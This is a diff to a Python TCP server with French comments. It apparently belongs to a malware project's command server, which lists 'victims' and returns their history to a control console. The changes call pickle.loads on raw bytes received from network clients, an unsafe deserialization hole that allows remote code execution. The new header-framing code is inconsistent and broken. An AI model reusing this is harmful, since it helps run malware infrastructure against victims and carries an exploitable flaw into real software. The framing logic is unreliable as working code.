@@ -19,12 +19,14 @@ import security
 import json
 import utile.data as udata
 import message
+import pickle
 
 # --------------------------------------------
 # Classes & Functions
 # --------------------------------------------
 
 print_lock = threading.Lock()
+
 
 class server_tcp(object):
 
@@ -33,6 +35,16 @@ class server_tcp(object):
         """
         self.ip = ip
         self.port = port
+
+    def create_header(self, c, HEADER_SIZE, message):
+        """
+        Créer un header pour la connexion TCP afin de savoir de où à où lire
+        """
+        message_bytes = message
+        message_length = len(message_bytes)
+        header = pickle.dumps(f'{message_length:<{HEADER_SIZE}}')  # en-tête de 10 bytes
+        c.sendall(header)
+        c.sendall(message_bytes)
 
     def start_server(self):
         """
@@ -63,9 +75,7 @@ class server_tcp(object):
         # Fermeture de la connexion
         self.s.close()
 
-
-
-    def gestion_msg(self, c,msg):
+    def gestion_msg(self, c, msg):
         """
         Système de gestion des commandes envoyées par la console de contrôle
         """
@@ -74,7 +84,7 @@ class server_tcp(object):
             # De sécurité...
             # On envoie la liste
             return udata.list_victim()
-        elif "HIST_REQ" in msg:
+        elif "HIST_REQ" in pickle.loads(msg):
             # On demande un ID en particulier pour une recherche d'historique
             # On envoie l'historique
             return udata.history_req(msg[-3:-2])
@@ -99,22 +109,23 @@ class server_tcp(object):
         c.send(bytes(str(binascii.hexlify(sec.showValues())), 'utf-8'))
         # Todo: Mettre en place le cryptage
         while True:
-            data = c.recv(2048).decode()
+            data = c.recv(2048)
             if not data:
                 print(sc[0] + ':' + str(sc[1]) + ' >> connexion closed.')
                 # Suppression du thread + Reset connexion TCP --> Suppression Thread = Force close de la connexion
                 print_lock.release()
                 break
             # On print l'ip de la connexion et sa demande
-            print(str(sc[0] + ':' + str(sc[1]) + " >> " + data))
+            print(str(sc[0] + ':' + str(sc[1]) + " >> " + pickle.loads(data)))
             # On construit une réponse grâce à la méthode gestion message
-            rs = str(self.gestion_msg(c, data))
+            rs = self.gestion_msg(c, data)
             # @Todo: Build header & send it before msg
-            r = sec.encrypt(bytes(rs.encode('utf-8')))
+            r = sec.encrypt(pickle.dumps(rs))
             # On l'envoie
-            c.send(r)
+            self.create_header(c, len(r), r)
         # On ferme la connexion du client lors de la fin de connexion
         c.close()
+
 
 # On initialise l'objet serveur avec les paramètres ip et port contenu dans le fichier config
 # Pour éviter le hard-coding et des modifications plus aisée...
